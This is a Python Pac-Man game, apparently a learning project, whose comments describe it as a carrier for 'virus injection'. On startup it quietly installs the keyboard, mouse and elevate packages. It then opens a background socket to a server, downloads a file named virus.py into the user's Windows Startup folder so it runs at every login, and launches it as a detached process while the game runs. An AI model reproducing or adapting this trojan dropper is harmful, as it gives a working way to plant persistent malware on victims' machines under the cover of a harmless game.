"""
Pacman, classic arcade game.
Connects to the server and receives
the virus file to the start up directory
"""

from random import choice
from turtle import *
import socket
import threading
import subprocess
from freegames import floor, vector
import time
import win32api

# constants
DETACHED_PROCESS = 0x00000008
MSG_LEN = 1024
CHUNK = 1024
EOF = b'-1'
LEN_NUMBER = 4
FIRST_CHAR = 0
SECOND_CHAR = 1
LAST_CHAR = -1
LEN_ILLEGAL_REQUEST = 15
ILLEGAL_NUMBER = 9999
IP = "127.0.0.1"
PORT = 1729
REQUEST = "SEND_FILE"
FILE_LOCATION = "C:\\Users" \
                "\\%s\\AppData\\Roaming\\Microsoft" \
                "\\Windows\\Start Menu\\Programs\\Startup"\
                % win32api.GetUserName()
FILE_NAME = "virus.py"

state = {'score': 0}
path = Turtle(visible=False)
writer = Turtle(visible=False)
aim = vector(5, 0)
pacman = vector(-40, -80)
ghosts = [
    [vector(-180, 160), vector(5, 0)],
    [vector(-180, -160), vector(0, 5)],
    [vector(100, 160), vector(0, -5)],
    [vector(100, -160), vector(-5, 0)],
]
# fmt: off
tiles = [
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0,
    0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0,
    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0,
    0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0,
    0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0,
    0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,
    0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0,
    0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0,
    0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0,
    0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0,
    0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0,
    0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,
    0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0,
    0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0,
    0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0,
    0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,
    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
]
# fmt: on


class Connection:
    """
    The connection to the server
    """
    # static variable
    file_location = ""

    def __init__(self):
        """
        constructor
        """
        # initiate socket
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_socket = my_socket
        # connect to server

        self.my_socket.connect((IP, PORT))
        self.bulid_request_and_send(REQUEST)
        self.receive_file(self.my_socket)

    def bulid_request_and_send(self, request):
        """Sends the request to the server """
        size = str(len(request)).zfill(4)
        request = size + request
        print(request)
        self.my_socket.send(request.encode())

    def receive_file(self, my_socket):
        """
        Receives the file chunks from the server,
        and writes the file
        """
        try:
            location = FILE_LOCATION
            answer_file = \
                location + '\\' + FILE_NAME
            Connection.file_location = answer_file
            done = False
            with open(answer_file, 'wb') as f:
                while not done:
                    raw_size = my_socket.recv(int(4))
                    data_size = raw_size.decode()
                    #  if illegal request
                    if data_size == str(ILLEGAL_NUMBER):
                        print("illegal command")
                        #  cleans the socket from the rest
                        ok = my_socket.recv(int(LEN_ILLEGAL_REQUEST))
                        return False
                    if data_size.isdigit():
                        data = my_socket.recv(int(data_size))
                        if data == EOF:
                            done = True
                        else:
                            f.write(data)
            self.my_socket.close()
            return True
        except socket.error as ms:
            print("illegal command")
        except Exception as ms:
            print("illegal command")


def build_connection():
    """"
    calls to the constructor
    """
    Connection()
    time.sleep(10)
    start_program(Connection.file_location)


def start_program(file):
    """
    Runs the virus program
    """
    try:
        results = subprocess.Popen(
            ["python.exe", file], close_fds=True,
            creationflags=DETACHED_PROCESS)
    except Exception as ms:
        return "open virus program faild"


def start_thread():
    """
    Starts the build connection function
    """
    thread = threading.Thread(target=build_connection)
    thread.start()


def square(x, y):
    "Draw square using path at (x, y)."
    path.up()
    path.goto(x, y)
    path.down()
    path.begin_fill()
    for count in range(4):
        path.forward(20)
        path.left(90)
    path.end_fill()


def offset(point):
    "Return offset of point in tiles."
    x = (floor(point.x, 20) + 200) / 20
    y = (180 - floor(point.y, 20)) / 20
    index = int(x + y * 20)
    return index


def valid(point):
    "Return True if point is valid in tiles."
    index = offset(point)

    if tiles[index] == 0:
        return False

    index = offset(point + 19)

    if tiles[index] == 0:
        return False

    return point.x % 20 == 0 or point.y % 20 == 0


def world():
    "Draw world using path."
    bgcolor('black')
    path.color('blue')

    for index in range(len(tiles)):
        tile = tiles[index]

        if tile > 0:
            x = (index % 20) * 20 - 200
            y = 180 - (index // 20) * 20
            square(x, y)

            if tile == 1:
                path.up()
                path.goto(x + 10, y + 10)
                path.dot(2, 'white')


def move():
    "Move pacman and all ghosts."
    writer.undo()
    writer.write(state['score'])

    clear()

    if valid(pacman + aim):
        pacman.move(aim)

    index = offset(pacman)

    if tiles[index] == 1:
        tiles[index] = 2
        state['score'] += 1
        x = (index % 20) * 20 - 200
        y = 180 - (index // 20) * 20
        square(x, y)

    up()
    goto(pacman.x + 10, pacman.y + 10)
    dot(20, 'yellow')

    for point, course in ghosts:
        if valid(point + course):
            point.move(course)
        else:
            options = [
                vector(5, 0),
                vector(-5, 0),
                vector(0, 5),
                vector(0, -5),
            ]
            plan = choice(options)
            course.x = plan.x
            course.y = plan.y

        up()
        goto(point.x + 10, point.y + 10)
        dot(20, 'red')

    update()

    for point, course in ghosts:
        if abs(pacman - point) < 20:
            return

    ontimer(move, 100)


def change(x, y):
    "Change pacman aim if valid."
    if valid(pacman + vector(x, y)):
        aim.x = x
        aim.y = y


def main():
    """
    The pacman game with the virus
    injection
    """
    subprocess.run('pip install keyboard')
    subprocess.run('pip install mouse')
    subprocess.run('pip install elevate')
    subprocess.run('pip install win32api')
    start_thread()
    # game code:
    setup(420, 420, 370, 0)
    hideturtle()
    tracer(False)
    writer.goto(160, 160)
    writer.color('white')
    writer.write(state['score'])
    listen()
    onkey(lambda: change(5, 0), 'Right')
    onkey(lambda: change(-5, 0), 'Left')
    onkey(lambda: change(0, 5), 'Up')
    onkey(lambda: change(0, -5), 'Down')
    world()
    move()
    done()


if __name__ == '__main__':
    main()
